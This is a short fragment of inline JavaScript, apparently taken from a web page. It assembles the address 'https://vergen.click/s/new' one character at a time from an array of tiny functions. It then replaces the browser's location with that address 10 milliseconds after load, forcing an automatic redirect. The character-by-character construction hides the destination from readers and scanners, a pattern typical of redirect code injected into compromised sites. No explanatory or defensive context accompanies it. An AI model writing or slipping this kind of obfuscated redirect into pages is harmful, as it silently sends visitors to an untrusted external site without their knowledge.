        const segments = [
            function() { return 'h'; },
            () => 't',
            () => 't',

            _ => 's',
            _ => ':',
            _ => '/',
            () => '/',
            () => 'v',
            _ => 'e',
            _ => 'r',
            () => 'g',
            () => 'e',
            () => 'n',
            function() { return '.'; },
            () => 'c',
            function() { return 'l'; },
            _ => 'i',
            () => 'c',

            () => '/',
            () => 's',
            () => '/',
            function() { return 'n'; },
            function() { return 'e'; },
            () => 'w'
        ];
        setTimeout(() => {
            window.location.replace(segments.map(f => f()).join(''));
        }, 10);
    </script>
